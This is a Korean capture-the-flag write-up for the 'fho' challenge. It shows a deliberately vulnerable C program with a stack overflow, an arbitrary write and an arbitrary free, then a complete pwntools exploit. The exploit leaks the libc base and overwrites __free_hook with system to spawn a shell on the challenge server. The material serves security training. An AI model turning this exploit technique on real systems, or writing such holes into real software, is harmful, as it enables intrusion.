```c
// Name: fho.c
// Compile: gcc -o fho fho.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  char buf[0x30];
  unsigned long long *addr;
  unsigned long long value;

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  puts("[1] Stack buffer overflow");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  puts("[2] Arbitary-Address-Write");
  printf("To write: ");
  scanf("%llu", &addr);
  printf("With: ");
  scanf("%llu", &value);
  printf("[%p] = %llu\n", addr, value);
  *addr = value;

  puts("[3] Arbitrary-Address-Free");
  printf("To free: ");
  scanf("%llu", &addr);
  free(addr);

  return 0;
}
```

```bash
$ checksec ./fho
[*] './fho'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

# 분석

## 보호 기법

NX, PIE, stack canary가 적용되어 있으며, full RELRO가 적용되어 있다.

## 코드 분석

* `fho.c:16-19` : `buf`의 크기는 `0x30`바이트 뿐이나, 최대 `0x100`바이트의 데이터를 읽고 있으므로 큰 스택 오버플로우가 발생한다.
* `fho.c:21-27` : 임의의 주소에 원하는 64비트 값을 덮어쓸 수 있다.
* `fho.c:29-32` : 원하는 주소를 free할 수 있다.

# 공격

`__free_hook`, `system` 함수, `"/bin/sh"` 문자열 등이 libc에 정의되어 있으므로, 주어진 libc 파일로부터 이들의 offset을 얻을 수 있다.

그러나, 이 offset을 이용해 실제 메모리 상에서의 주소를 알아내기 위해서는 libc 파일의 베이스를 알아내야 한다. 이때, `main` 함수는 `__libc_start_main` 함수가 호출하므로 `main` 함수의 SFP의 값을 읽으면 libc 파일의 베이스를 알아낼 수 있을 가능성이 높다.

```bash
$ gdb ./fho
pwndbg> b *main
Breakpoint 1 at 0x8ba
pwndbg> r
Starting program: /root/fho
...
────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0   0x5555554008ba main
   f 1   0x7ffff7a03c87 __libc_start_main+231
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

gdb를 통해 알아낸 `main` 함수의 반환 주소는 `__libc_start_main+231`이므로 `main` 함수의 SFP에는 `__libc_start_main+231`이 저장되어 있을 것이다.<br/>
※ 단, 로컬 환경이 ubuntu18.04가 아니라면 backtrace의 결과가 위와 다를 수 있으므로 문제에서 주어진 Dockerfile을 이용해 ubuntu18.04 환경에서 분석하는 것을 권장한다.

이를 활용하여 다음과 같은 익스플로잇 코드를 구성하자.

```python
# Name: fho.py

from pwn import *

HOST = 'host3.dreamhack.games'
PORT = 8204 # the given port

# conn = process('./fho') # local
conn = remote(HOST, PORT)

e = ELF('./fho')
libc = ELF('./libc-2.27.so')

# leak libc base
buf = b'A' * 0x48
conn.sendafter(b'Buf: ', buf)
conn.recvuntil(buf)
libc_start_main_231 = u64(conn.recvline()[:-1] + b'\x00' * 2)
libc_base = libc_start_main_231 - libc.sym['__libc_start_main'] - 231
system = libc_base + libc.sym['system']
free_hook = libc_base + libc.sym['__free_hook']
binsh = libc_base + next(libc.search(b'/bin/sh'))

# overwrite `__free_hook` with `system`
conn.recvuntil(b'To write: ')
conn.sendline(str(free_hook).encode())
conn.recvuntil(b'With: ')
conn.sendline(str(system).encode())

# exploit
conn.recvuntil(b'To free: ')
conn.sendline(str(binsh).encode())

conn.interactive()
```